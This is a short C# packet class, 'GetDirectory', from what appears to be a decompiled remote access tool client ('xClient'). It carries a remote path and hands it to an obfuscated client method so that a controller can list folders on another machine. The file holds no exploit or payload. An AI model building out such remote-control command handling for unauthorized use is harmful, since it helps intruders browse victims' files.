using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class GetDirectory : GInterface4
{
	public string RemotePath { get; set; }

	public GetDirectory()
	{
	}

	public GetDirectory(string remotepath)
	{
		RemotePath = remotepath;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
